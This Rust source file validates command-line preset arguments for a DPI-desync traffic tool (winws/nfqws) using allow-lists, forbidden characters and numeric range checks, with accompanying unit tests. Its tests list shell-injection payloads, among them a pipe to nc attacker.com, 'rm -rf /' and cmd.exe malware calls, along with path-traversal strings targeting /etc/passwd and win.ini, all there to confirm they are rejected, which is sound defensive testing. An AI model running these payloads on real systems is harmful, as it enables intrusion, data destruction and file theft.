use crate::engine::error::EngineError;

const MAX_ARG_COUNT: usize = 30;
const MAX_ARG_LEN: usize = 128;

const ALLOWED_PREFIXES: &[&str] = &[
    "--filter-tcp=",
    "--filter-udp=",
    "--wf-tcp=",
    "--wf-udp=",
    "--windivert=",
    "tcp.",
    "udp.",
    "icmp.",
    "--qnum=",
    "--dpi-desync=",
    "--dpi-desync-split-pos=",
    "--dpi-desync-repeats=",
    "--dpi-desync-fooling=",
    "--dpi-desync-ttl=",
    "--dpi-desync-cutoff=",
    "--dpi-desync-split-http-req=",
    "--dpi-desync-split-tls=",
    "--wssize=",
];

const ALLOWED_EXACT_ARGS: &[&str] = &[
    "--windivert",
    "--dpi-desync-any-protocol",
    "--dpi-desync-autottl",
    "--debug",
    "--debug2",
];

const FORBIDDEN_CHARS: &[char] = &[
    '&', ';', '|', '`', '$', '<', '>', '\'', '"', '\\', '/', '\n', '\r', '\0',
];

pub fn validate_preset_args(args: &[String]) -> Result<(), EngineError> {
    if args.len() > MAX_ARG_COUNT {
        return Err(EngineError::InvalidPreset(format!(
            "Argüman sayısı limiti aşıldı: {} > {} (izin verilen maksimum).",
            args.len(),
            MAX_ARG_COUNT
        )));
    }

    for arg in args {
        validate_single_arg(arg)?;
    }

    Ok(())
}

fn validate_single_arg(arg: &str) -> Result<(), EngineError> {
    if arg.len() > MAX_ARG_LEN {
        return Err(EngineError::InvalidPreset(format!(
            "Argüman çok uzun ({} karakter > {} limit): \"{}…\"",
            arg.len(),
            MAX_ARG_LEN,
            arg.chars().take(32).collect::<String>()
        )));
    }

    if arg.is_empty() {
        return Err(EngineError::InvalidPreset(
            "Boş argüman kabul edilmiyor.".into(),
        ));
    }

    for &ch in FORBIDDEN_CHARS {
        if arg.contains(ch) {
            return Err(EngineError::InvalidPreset(format!(
                "Güvenli olmayan karakter '{:?}' argümanda tespit edildi: \"{}\"",
                ch,
                sanitize_for_log(arg)
            )));
        }
    }

    let is_allowed = ALLOWED_EXACT_ARGS.contains(&arg)
        || ALLOWED_PREFIXES
            .iter()
            .any(|prefix| arg.starts_with(prefix));

    if !is_allowed {
        return Err(EngineError::InvalidPreset(format!(
            "Tanınmayan argüman reddedildi: \"{}\". \
             Yalnızca bilinen winws/nfqws parametreleri kabul edilir.",
            sanitize_for_log(arg)
        )));
    }

    if let Some(value) = arg
        .strip_prefix("--wf-tcp=")
        .or_else(|| arg.strip_prefix("--wf-udp="))
        .or_else(|| arg.strip_prefix("--filter-tcp="))
        .or_else(|| arg.strip_prefix("--filter-udp="))
    {
        validate_port_spec(value)?;
    } else if let Some(value) = arg.strip_prefix("--dpi-desync-cutoff=") {
        validate_cutoff(value)?;
    } else if let Some(value) = arg
        .strip_prefix("--dpi-desync=")
    {
        validate_strategy(value)?;
    } else if let Some(value) = arg.strip_prefix("--dpi-desync-fooling=") {
        validate_fooling(value)?;
    } else if let Some(value) = arg.strip_prefix("--dpi-desync-split-http-req=") {
        validate_legacy_split_selector(value, &["method", "host"])?;
    } else if let Some(value) = arg.strip_prefix("--dpi-desync-split-tls=") {
        validate_legacy_split_selector(value, &["sni", "sniext"])?;
    } else if let Some(value) = arg.strip_prefix("--dpi-desync-ttl=") {
        validate_number(value, 1, 255, "TTL")?;
    } else if let Some(value) = arg.strip_prefix("--dpi-desync-repeats=") {
        validate_number(value, 1, 100, "repeat count")?;
    } else if let Some(value) = arg
        .strip_prefix("--dpi-desync-split-pos=")
    {
        validate_split_positions(value)?;
    } else if let Some(value) = arg.strip_prefix("--wssize=") {
        validate_number(value, 1, 16_777_216, "TCP window")?;
    } else if let Some(value) = arg.strip_prefix("--qnum=") {
        validate_number(value, 0, 65_535, "queue number")?;
    }

    Ok(())
}

fn validate_number(
    value: &str,
    minimum: u32,
    maximum: u32,
    label: &str,
) -> Result<(), EngineError> {
    let parsed = value
        .parse::<u32>()
        .map_err(|_| EngineError::InvalidPreset(format!("{label} must be an integer.")))?;
    if !(minimum..=maximum).contains(&parsed) {
        return Err(EngineError::InvalidPreset(format!(
            "{label} must be between {minimum} and {maximum}."
        )));
    }
    Ok(())
}

fn validate_port_spec(value: &str) -> Result<(), EngineError> {
    if value.is_empty() {
        return Err(EngineError::InvalidPreset(
            "Port list cannot be empty.".into(),
        ));
    }
    for token in value.split(',') {
        if let Some((start, end)) = token.split_once('-') {
            let start = start
                .parse::<u16>()
                .map_err(|_| EngineError::InvalidPreset("Port range is invalid.".into()))?;
            let end = end
                .parse::<u16>()
                .map_err(|_| EngineError::InvalidPreset("Port range is invalid.".into()))?;
            if start == 0 || start > end {
                return Err(EngineError::InvalidPreset(
                    "Port range is outside 1-65535 or reversed.".into(),
                ));
            }
        } else {
            let port = token.parse::<u16>().map_err(|_| {
                EngineError::InvalidPreset("Port must be an integer between 1 and 65535.".into())
            })?;
            if port == 0 {
                return Err(EngineError::InvalidPreset("Port 0 is not accepted.".into()));
            }
        }
    }
    Ok(())
}

fn validate_cutoff(value: &str) -> Result<(), EngineError> {
    let (kind, number) = value.split_at(
        value
            .char_indices()
            .nth(1)
            .map(|(index, _)| index)
            .unwrap_or(value.len()),
    );
    if !matches!(kind, "n" | "d" | "s") {
        return Err(EngineError::InvalidPreset(
            "Desync cutoff must start with n, d, or s.".into(),
        ));
    }
    validate_number(number, 1, 1_000_000, "desync cutoff")
}

fn validate_split_positions(value: &str) -> Result<(), EngineError> {
    const MARKERS: &[&str] = &[
        "method", "host", "endhost", "sld", "endsld", "midsld", "sniext",
    ];
    if value.is_empty() {
        return Err(EngineError::InvalidPreset(
            "Split position cannot be empty.".into(),
        ));
    }
    for token in value.split(',') {
        if let Ok(position) = token.parse::<i32>() {
            if position == 0 || !(-65_535..=65_535).contains(&position) {
                return Err(EngineError::InvalidPreset(
                    "Numeric split position must be between -65535 and 65535, excluding zero."
                        .into(),
                ));
            }
            continue;
        }
        let marker_end = token.find(['+', '-']).unwrap_or(token.len());
        let (marker, offset) = token.split_at(marker_end);
        if !MARKERS.contains(&marker) {
            return Err(EngineError::InvalidPreset(
                "Split position contains an unsupported marker.".into(),
            ));
        }
        if !offset.is_empty()
            && (offset.len() == 1
                || offset[1..].parse::<u16>().is_err()
                || !matches!(offset.as_bytes()[0], b'+' | b'-'))
        {
            return Err(EngineError::InvalidPreset(
                "Split marker offset must use +N or -N.".into(),
            ));
        }
    }
    Ok(())
}

fn validate_strategy(value: &str) -> Result<(), EngineError> {
    const MODES: &[&str] = &[
        "synack", "syndata", "fake", "fakeknown", "rst", "rstack", "hopbyhop",
        "destopt", "ipfrag1", "multisplit", "multidisorder", "fakedsplit",
        "fakeddisorder", "hostfakesplit", "ipfrag2", "udplen", "tamper",
    ];
    if value.is_empty() || value.split(',').any(|mode| !MODES.contains(&mode)) {
        return Err(EngineError::InvalidPreset(
            "Desync strategy is not supported by the bundled engine.".into(),
        ));
    }
    Ok(())
}

fn validate_fooling(value: &str) -> Result<(), EngineError> {
    const MODES: &[&str] = &[
        "none", "md5sig", "badseq", "badsum", "datanoack", "ts", "hopbyhop", "hopbyhop2",
    ];
    if value.is_empty() || value.split(',').any(|mode| !MODES.contains(&mode)) {
        return Err(EngineError::InvalidPreset(
            "Fooling mode is not supported by the bundled engine.".into(),
        ));
    }
    Ok(())
}

fn validate_legacy_split_selector(value: &str, allowed: &[&str]) -> Result<(), EngineError> {
    if allowed.contains(&value) {
        Ok(())
    } else {
        Err(EngineError::InvalidPreset(
            "Split selector is not supported by the bundled engine.".into(),
        ))
    }
}

fn sanitize_for_log(s: &str) -> String {
    s.chars()
        .take(48)
        .map(|c| if c.is_control() { '?' } else { c })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_valid_args_pass() {
        let args = vec![
            "--wf-tcp=80,443".to_string(),
            "--dpi-desync=fake".to_string(),
            "--dpi-desync-autottl".to_string(),
            "--wssize=1300".to_string(),
            "--filter-tcp=80".to_string(),
            "--windivert".to_string(),
            "tcp.DstPort==443".to_string(),
            "--qnum=200".to_string(),
        ];
        assert!(validate_preset_args(&args).is_ok());
    }

    #[test]
    fn test_shell_injection_rejected() {
        let payloads = vec![
            "--dpi-desync=fake && cmd.exe /c malware.exe",
            "--mss=1300; rm -rf /",
            "--wf-tcp=80|nc attacker.com 4444",
            "--dpi-desync=`whoami`",
            "--mss=$(evil)",
        ];
        for payload in payloads {
            let args = vec![payload.to_string()];
            assert!(
                validate_preset_args(&args).is_err(),
                "Injection geçmemeli: {}",
                payload
            );
        }
    }

    #[test]
    fn test_unknown_arg_rejected() {
        let args = vec!["--unknown-flag=value".to_string()];
        assert!(validate_preset_args(&args).is_err());
    }

    #[test]
    fn test_empty_arg_rejected() {
        let args = vec!["".to_string()];
        assert!(validate_preset_args(&args).is_err());
    }

    #[test]
    fn test_too_many_args_rejected() {
        let args: Vec<String> = (0..=MAX_ARG_COUNT)
            .map(|_| "--dpi-desync-autottl".to_string())
            .collect();
        assert!(validate_preset_args(&args).is_err());
    }

    #[test]
    fn test_arg_too_long_rejected() {
        let long_arg = format!("--dpi-desync={}", "x".repeat(MAX_ARG_LEN));
        let args = vec![long_arg];
        assert!(validate_preset_args(&args).is_err());
    }

    #[test]
    fn long_multibyte_arg_is_rejected_without_panicking() {
        let args = vec![format!("--dpi-desync={}", "ş".repeat(80))];
        assert!(validate_preset_args(&args).is_err());
    }

    #[test]
    fn exact_flags_reject_appended_text() {
        for arg in ["--debuganything", "--windivertanything", "--dpi-desync-any-protocol=true"] {
            assert!(validate_preset_args(&[arg.to_string()]).is_err(), "invalid exact flag passed: {arg}");
        }
    }

    #[test]
    fn semantic_values_are_checked() {
        for arg in ["--wf-tcp=0", "--wf-udp=70000", "--bind-addr=not-an-ip", "--dpi-desync-ttl=999"] {
            assert!(validate_preset_args(&[arg.to_string()]).is_err(), "invalid value passed: {arg}");
        }
    }

    #[test]
    fn test_path_traversal_rejected() {
        let payloads = vec![
            "../../../etc/passwd",
            "--hostlist=../../../etc/passwd",
            "--hostlist=C:/Windows/win.ini",
            "--hostlist=..\\..\\Windows\\win.ini",
        ];
        for payload in payloads {
            let args = vec![payload.to_string()];
            assert!(
                validate_preset_args(&args).is_err(),
                "Path traversal did not fail: {}",
                payload
            );
        }
    }

    #[test]
    fn test_windivert_args_pass() {
        let args = vec![
            "--windivert".to_string(),
            "--windivert=filter".to_string(),
            "tcp.DstPort==443".to_string(),
            "udp.DstPort==443".to_string(),
            "icmp.Type==8".to_string(),
        ];
        assert!(validate_preset_args(&args).is_ok());
    }

    #[test]
    fn test_linux_qnum_arg_passes() {
        let args = vec!["--qnum=200".to_string()];
        assert!(validate_preset_args(&args).is_ok());
    }

    #[test]
    fn preset_hostlist_args_are_rejected_so_pattern_remains_authoritative() {
        let args = vec![
            "--hostlist=list.txt".to_string(),
            "--wl=example.com".to_string(),
        ];
        assert!(validate_preset_args(&args).is_err());
    }

    #[test]
    fn unsupported_tpws_and_ipset_args_are_rejected() {
        for arg in ["--socks=127.0.0.1:1080", "--ipset=targets.txt"] {
            assert!(
                validate_preset_args(&[arg.to_string()]).is_err(),
                "unsupported feature was accepted: {arg}"
            );
        }
    }

    use proptest::prelude::*;

    proptest! {
        #[test]
        fn preset_hostlist_is_always_rejected(s in ".*") {
            let arg = format!("--hostlist={}", s);
            let result = validate_single_arg(&arg);
            assert!(result.is_err(), "Preset hostlist unexpectedly passed: {}", s);
        }

        #[test]
        fn preset_whitelist_is_always_rejected(s in "[a-zA-Z0-9_-]{1,20}(\\.[a-zA-Z0-9_-]{1,20})*") {
            let arg = format!("--wl={}", s);
            let result = validate_single_arg(&arg);
            assert!(result.is_err(), "Preset whitelist unexpectedly passed: {}", s);
        }
    }
}
